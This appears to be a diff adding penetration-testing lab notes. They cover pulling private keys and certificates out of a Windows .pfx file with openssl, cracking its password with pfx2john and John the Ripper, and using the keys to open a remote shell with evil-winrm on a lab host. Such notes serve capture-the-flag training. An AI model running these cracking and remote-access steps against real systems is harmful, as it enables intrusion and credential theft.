@@ -1,0 +1,19 @@
+IF NOT PASSWORD PROTECTED SKIP TO LINE 5.
+
+1. .pfx files are windows files that contain private and public keys.
+
+2. use this command to extract the keys == openssl pkcs12 -in mykey.pfx -nocerts -out mykey.key
+
+3. if it is password protected, make a hash using pfx2john == pfx2john.py mykey.pfx | tee mykey.pfx.hash
+
+4. then crack it == john --wordlist=/usr/share/wordlists/rockyou.txt mykey.pfx.hash
+
+5. first, use this command, enter password if applicable and create a 4 letter passwd for .pem file == openssl pkcs12 -in mykey.pfx -nocerts -out mykey.key-enc
+
+6. then, run this command to get private key == openssl rsa -in mykey.key-enc -out mykey.key
+
+7. then, dump public key == openssl pkcs12 -in mykey.pfx -clcerts -nokeys -out mykey.crt
+
+EXAMPLE USAGE OF KEYS
+
+evil-winrm -i box.htb -S -k mykey.key -c mykey.crt
